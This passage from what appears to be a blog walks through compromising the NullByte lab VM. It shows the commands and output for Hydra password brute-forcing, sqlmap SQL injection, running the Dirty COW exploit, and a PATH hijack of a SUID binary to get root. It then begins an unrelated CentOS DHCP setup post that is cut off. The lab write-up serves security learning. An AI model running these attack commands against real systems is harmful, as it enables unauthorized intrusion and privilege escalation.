</span><span class='line'>777/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
</span><span class='line'>53755/tcp open  status  syn-ack ttl 64 1 (RPC #100024)</span></code></pre></td></tr></table></div></figure>


<p>Hmm, SSH on port 777? Oh well, let&rsquo;s look at the web server first:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/nullbyte/web.png" title="nullbyte web" alt="nullbyte web page"></p>

<p>Just an image, nothing in the source, no robots.txt. I needed to see if there are any other interesting directories, but instead of Dirbuster, I used TheColonial&rsquo;s <a href="https://github.com/OJ/gobuster">Gobuster</a>, which is a CLI tool written in Go:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gobuster -u http://192.168.217.135/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
</span><span class='line'>
</span><span class='line'>Gobuster v1.2                OJ Reeves (@TheColonial)
</span><span class='line'>=====================================================
</span><span class='line'>[+] Mode         : dir
</span><span class='line'>[+] Url/Domain   : http://192.168.217.135/
</span><span class='line'>[+] Threads      : 10
</span><span class='line'>[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
</span><span class='line'>[+] Status codes : 200,204,301,302,307
</span><span class='line'>=====================================================
</span><span class='line'>/uploads (Status: 301)
</span><span class='line'>/javascript (Status: 301)
</span><span class='line'>/phpmyadmin (Status: 301)
</span><span class='line'>=====================================================</span></code></pre></td></tr></table></div></figure>


<p>Unfortunately, nothing in there either. The only thing that we have so far is an image. Let&rsquo;s hope there is no (or very rudimentary) steganography involved. I looked at the metadata of the image:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exiftool main.gif
</span><span class='line'>ExifTool Version Number         : 10.40
</span><span class='line'>File Name                       : main.gif
</span><span class='line'>Directory                       : .
</span><span class='line'>File Size                       : 16 kB
</span><span class='line'>File Modification Date/Time     : 2017:04:18 12:24:59-04:00
</span><span class='line'>File Access Date/Time           : 2017:04:18 12:24:59-04:00
</span><span class='line'>File Inode Change Date/Time     : 2017:04:18 12:24:59-04:00
</span><span class='line'>File Permissions                : rw-r--r--
</span><span class='line'>File Type                       : GIF
</span><span class='line'>File Type Extension             : gif
</span><span class='line'>MIME Type                       : image/gif
</span><span class='line'>GIF Version                     : 89a
</span><span class='line'>Image Width                     : 235
</span><span class='line'>Image Height                    : 302
</span><span class='line'>Has Color Map                   : No
</span><span class='line'>Color Resolution Depth          : 8
</span><span class='line'>Bits Per Pixel                  : 1
</span><span class='line'>Background Color                : 0
</span><span class='line'>Comment                         : P-): kzMb5nVYJw
</span><span class='line'>Image Size                      : 235x302
</span><span class='line'>Megapixels                      : 0.071</span></code></pre></td></tr></table></div></figure>


<p>Hello there, conspicuous comment section! On a hunch, I tried navigating to a folder with that name on the web server, and finally seeing something promising:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/nullbyte/key.png" title="key" alt="key form"></p>

<p>And in the source, there is a comment stating that &ldquo;this form isn&rsquo;t connected to mysql, password ain&rsquo;t that complex&rdquo;. Ok, so no SQLi then. I took the hint and set to brute forcing the password. I used Hydra for this, so I had to take note of the form parameters:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;center&gt;</span>
</span><span class='line'><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span> <span class="na">action=</span><span class="s">&quot;index.php&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>Key:<span class="nt">&lt;br&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="na">name=</span><span class="s">&quot;key&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;/form&gt;</span>
</span><span class='line'><span class="nt">&lt;/center&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Also, trying the wrong key gives the message invalid key. Armed with this info, I constructed the Hydra query:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra 192.168.217.135 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l meh -P /usr/share/dict/words -t 10 -w 10</span></code></pre></td></tr></table></div></figure>


<p>This looks ugly, so let me break it into pieces:</p>

<ul>
<li><p>192.168.217.135 = target name</p></li>
<li><p>http-form-post = the method used</p></li>
<li><p>&ldquo;/kzMb5nVYJw/index.php&rdquo; = URL</p></li>
<li><p>key=^PASS^:invalid key&#8221; = the form parameter is called key, the PASS variable will be replaced with passwords from the password file, and Hydra will see as successful a response that doesn&rsquo;t contain the string &ldquo;invalid key&rdquo;</p></li>
<li><p>-l meh = you have to specify a username for Hydra to work, even though in this case there was no user, so I put something random</p></li>
<li><p>-P /usr/share/dict/words = password File</p></li>
<li><p>-t 10 = number of Threads</p></li>
<li><p>-w 10 = timeout value</p></li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Hydra v8.3 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2017-04-18 13:11:54
</span><span class='line'>[DATA] max 10 tasks per 1 server, overall 64 tasks, 99171 login tries (l:1/p:99171), ~154 tries per task
</span><span class='line'>[DATA] attacking service http-post-form on port 80
</span><span class='line'>[STATUS] 1170.00 tries/min, 1170 tries in 00:01h, 98001 to do in 01:24h, 10 active
</span><span class='line'>[STATUS] 1173.33 tries/min, 3520 tries in 00:03h, 95651 to do in 01:22h, 10 active
</span><span class='line'>[STATUS] 1173.86 tries/min, 8217 tries in 00:07h, 90954 to do in 01:18h, 10 active
</span><span class='line'>[STATUS] 1174.00 tries/min, 17610 tries in 00:15h, 81561 to do in 01:10h, 10 active
</span><span class='line'>[STATUS] 1174.32 tries/min, 36404 tries in 00:31h, 62767 to do in 00:54h, 10 active
</span><span class='line'>[80][http-post-form] host: 192.168.217.135   login: meh   password: elite
</span><span class='line'>1 of 1 target successfully completed, 1 valid password found
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) finished at 2017-04-18 13:45:57</span></code></pre></td></tr></table></div></figure>


<p>We can see that Hydra found the password: elite ! Inputting it takes us to another form:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/nullbyte/username.png" title="username" alt="search username"></p>

<p>Whatever I entered into the form, I got the message &ldquo;Fetched data successfully&rdquo;. I looked at the source code and found another page to check:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;p&gt;</span>Search for usernames: <span class="nt">&lt;/p&gt;</span>
</span><span class='line'><span class="nt">&lt;hr&gt;</span>
</span><span class='line'><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">&quot;420search.php&quot;</span> <span class="na">method=</span><span class="s">&quot;get&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>Enter username:<span class="nt">&lt;br&gt;</span>
</span><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">name=</span><span class="s">&quot;usrtosearch&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;/form&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Navigating to 420search.php revealed 2 usernames:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>EMP ID :1
</span><span class='line'>EMP NAME : ramses
</span><span class='line'>EMP POSITION :
</span><span class='line'>--------------------------------
</span><span class='line'>EMP ID :2
</span><span class='line'>EMP NAME : isis
</span><span class='line'>EMP POSITION : employee
</span><span class='line'>--------------------------------
</span><span class='line'>Fetched data successfully</span></code></pre></td></tr></table></div></figure>


<p>I pointed sqlmap to the usrtosearch parameter and was able to pull data from the DB:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.217.135/kzMb5nVYJw/420search.php?usrtosearch=isis" -p usrtosearch --dbms=MySQL --tables
</span><span class='line'>...
</span><span class='line'>[04:24:25] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, phpmyadmin, seth'
</span><span class='line'>...
</span><span class='line'>Database: seth
</span><span class='line'>[1 table]
</span><span class='line'>+----------------------------------------------+
</span><span class='line'>| users                                        |
</span><span class='line'>+----------------------------------------------+
</span><span class='line'>...</span></code></pre></td></tr></table></div></figure>


<p>Next I enumerated the users table in the seth DB, and I got a password for ramses:</p>

<p><img class="center" src="http://chousensha.github.io/images/pentest/nullbyte/users.png" title="users" alt="users csv"></p>

<p>I went back to that unconventional SSH port and tried to log in as ramses with the password: YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE . When that didn&rsquo;t work, I fed it to Google and the first MD5 decoder that popped decrypted it as <code>omega</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh -p 777 ramses@192.168.217.135
</span><span class='line'>ramses@192.168.217.135's password:
</span><span class='line'>
</span><span class='line'>The programs included with the Debian GNU/Linux system are free software;
</span><span class='line'>the exact distribution terms for each program are described in the
</span><span class='line'>individual files in /usr/share/doc/*/copyright.
</span><span class='line'>
</span><span class='line'>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span><span class='line'>permitted by applicable law.
</span><span class='line'>Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
</span><span class='line'>ramses@NullByte:~$</span></code></pre></td></tr></table></div></figure>


<p>Time to look around the system!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /home
</span><span class='line'>total 12
</span><span class='line'>drwxr-xr-x 2 bob    bob    4096 Aug  2  2015 bob
</span><span class='line'>drwxr-xr-x 2 eric   eric   4096 Aug  2  2015 eric
</span><span class='line'>drwxr-xr-x 2 ramses ramses 4096 Aug  2  2015 ramses</span></code></pre></td></tr></table></div></figure>


<p>Nothing interesting in those home directories. I looked at the kernel version next:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>uname -v
</span><span class='line'>#1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17)</span></code></pre></td></tr></table></div></figure>


<p>A bit of google-fu revealed that this kernel is vulnerable to CVE-2016-5195, or more popularly known as the <a href="https://www.exploit-db.com/exploits/40616/">Dirty Cow exploit</a> . It is possible to exploit a race condition to escalate privileges to root! I downloaded the source code to the NullByte VM, commented out the x64 payload and uncommented the x86 one, and then I compiled it with <code>gcc dirtycow.c -o dirtycow -pthread</code>. I got some warnings, but was able to run it successfully:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./dirtycow
</span><span class='line'>DirtyCow root privilege escalation
</span><span class='line'>Backing up /usr/bin/passwd.. to /tmp/bak
</span><span class='line'>Size of binary: 53112
</span><span class='line'>Racing, this may take a while..
</span><span class='line'>thread stopped
</span><span class='line'>/usr/bin/passwd is overwritten
</span><span class='line'>Popping root shell.
</span><span class='line'>Don't forget to restore /tmp/bak
</span><span class='line'>thread stopped
</span><span class='line'>root@NullByte:/home/ramses# whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>The system crashed shortly afterwards, so I followed the advice in the exploit source code and did <code>echo 0 > /proc/sys/vm/dirty_writeback_centisecs</code>, and it didn&rsquo;t crash anymore. With this, I was able to read the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat /root/proof.txt
</span><span class='line'>adf11c7a9e6523e630aaf3b9b7acb51d
</span><span class='line'>
</span><span class='line'>It seems that you have pwned the box, congrats.
</span><span class='line'>Now you done that I wanna talk with you. Write a walk & mail at
</span><span class='line'>xly0n@sigaint.org attach the walk and proof.txt
</span><span class='line'>If sigaint.org is down you may mail at nbsly0n@gmail.com
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>USE THIS PGP PUBLIC KEY
</span><span class='line'>
</span><span class='line'>-----BEGIN PGP PUBLIC KEY BLOCK-----
</span><span class='line'>Version: BCPG C# v1.6.1.0
</span><span class='line'>
</span><span class='line'>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
</span><span class='line'>Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
</span><span class='line'>e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
</span><span class='line'>Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
</span><span class='line'>+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
</span><span class='line'>YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
</span><span class='line'>Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
</span><span class='line'>HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
</span><span class='line'>m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
</span><span class='line'>XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
</span><span class='line'>kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
</span><span class='line'>TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
</span><span class='line'>Gms=
</span><span class='line'>=PiAQ
</span><span class='line'>-----END PGP PUBLIC KEY BLOCK-----</span></code></pre></td></tr></table></div></figure>


<p>After completing this and looking at other walkthroughs to see alternate ways of exploitation, I realized that I completely missed the way this VM was supposed to be exploited, so below is the intended way of solving this:</p>

<p>Inside ramses&#8217; home folder is a <strong>.bash_history</strong> file that I neglected reading:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo -s
</span><span class='line'>su eric
</span><span class='line'>exit
</span><span class='line'>ls
</span><span class='line'>clear
</span><span class='line'>cd /var/www
</span><span class='line'>cd backup/
</span><span class='line'>ls
</span><span class='line'>./procwatch
</span><span class='line'>clear
</span><span class='line'>sudo -s
</span><span class='line'>cd /
</span><span class='line'>ls
</span><span class='line'>exit</span></code></pre></td></tr></table></div></figure>


<p>An interesting path and binary. Let&rsquo;s see it on the filesystem:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -l /var/www/backup
</span><span class='line'>total 12
</span><span class='line'>-rwsr-xr-x 1 root root 4932 Aug  2  2015 procwatch
</span><span class='line'>-rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
</span><span class='line'>cat readme.txt
</span><span class='line'>I have to fix this mess...</span></code></pre></td></tr></table></div></figure>


<p>A SUID executable and a comment alluding to a mess..hmm, what could go wrong here..</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>./procwatch
</span><span class='line'>  PID TTY          TIME CMD
</span><span class='line'> 1535 pts/0    00:00:00 procwatch
</span><span class='line'> 1536 pts/0    00:00:00 sh
</span><span class='line'> 1537 pts/0    00:00:00 ps</span></code></pre></td></tr></table></div></figure>


<p>This looks like the output of the <strong>ps</strong> command. Let&rsquo;s see a normal ps:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ps
</span><span class='line'>  PID TTY          TIME CMD
</span><span class='line'> 1555 pts/0    00:00:00 bash
</span><span class='line'> 1605 pts/0    00:00:00 ps</span></code></pre></td></tr></table></div></figure>


<p>I played around with the executable, tried passing arguments, but it looks like it just calls ps and nothing else. In the ps manual, I paid attention to this:</p>

<blockquote><p>By default, ps selects all processes with the same effective user ID
(euid=EUID) as the current user and associated with the same terminal
as the invoker.</p></blockquote>

<p>So, we can see the succession for a normal ps is bash &ndash;> ps, and for the SUID binary is procwatch &ndash;> sh &ndash;> ps. Maybe we can intercept the call to ps by creating an arbitrary binary called ps and placing it in the PATH variable. And of course, we want a shell!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cp /bin/sh /tmp/ps</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s look at the PATH environment variable:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo $PATH
</span><span class='line'>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>Ok, since I&rsquo;ve placed the fake ps in /tmp, I want to add that to the path:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export PATH=/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
</span><span class='line'>ramses@NullByte:/var/www/backup$ echo $PATH
</span><span class='line'>/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span></code></pre></td></tr></table></div></figure>


<p>Fingers crossed, running procwatch again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ramses@NullByte:/var/www/backup$ ./procwatch
</span><span class='line'># whoami
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>And we&rsquo;re root..the right way! :D</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/ You'll wish that you had done some of \
</span><span class='line'>| the hard things when they were easier |
</span><span class='line'>\ to do.                                /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[DHCP server on CentOS]]></title>
    <link href="http://chousensha.github.io/blog/2017/04/13/dhcp-server-on-centos/"/>
    <updated>2017-04-13T13:59:25-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/04/13/dhcp-server-on-centos</id>
    <content type="html"><![CDATA[<p>In this post I will continue the series on configuring various servers on the CentOS 7 distribution. Let&rsquo;s see how we can get a DHCP server up and running!</p>

<!-- more -->


<h2>Installing DHCP server</h2>

<p>First, we need to intall the server component, which can be done with the <code>yum install dhcp</code> command:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>=====================================================================================================================================================
</span><span class='line'> Package                       Arch                            Version                                           Repository                     Size
</span><span class='line'>=====================================================================================================================================================
</span><span class='line'>Installing:
</span><span class='line'> dhcp                          x86_64                          12:4.2.5-47.el7.centos                            base                          511 k
</span><span class='line'>
</span><span class='line'>Transaction Summary
</span><span class='line'>=====================================================================================================================================================
</span><span class='line'>Install  1 Package
</span><span class='line'>
</span><span class='line'>Total download size: 511 k
</span><span class='line'>Installed size: 1.4 M
</span><span class='line'>Is this ok [y/d/N]: y
</span><span class='line'>Downloading packages:
</span><span class='line'>dhcp-4.2.5-47.el7.centos.x86_64.rpm                                                                                           | 511 kB  00:00:00     
</span><span class='line'>Running transaction check
</span><span class='line'>Running transaction test
</span><span class='line'>Transaction test succeeded
</span><span class='line'>Running transaction
</span><span class='line'>  Installing : 12:dhcp-4.2.5-47.el7.centos.x86_64                                                                                                1/1
</span><span class='line'>  Verifying  : 12:dhcp-4.2.5-47.el7.centos.x86_64                                                                                                1/1
</span><span class='line'>
</span><span class='line'>Installed:
</span><span class='line'>  dhcp.x86_64 12:4.2.5-47.el7.centos                                                                                                                 
</span><span class='line'>
</span><span class='line'>Complete!</span></code></pre></td></tr></table></div></figure>


<p>We now have a <code>/etc/dhcp/dhcpd.conf</code> file for configuring the server. There isn&rsquo;t much in it to start with, except pointers to the <code>dhcpd.conf</code> man page and a sample config file in <code>/usr/share/doc/dhcp*/dhcpd.conf.example</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
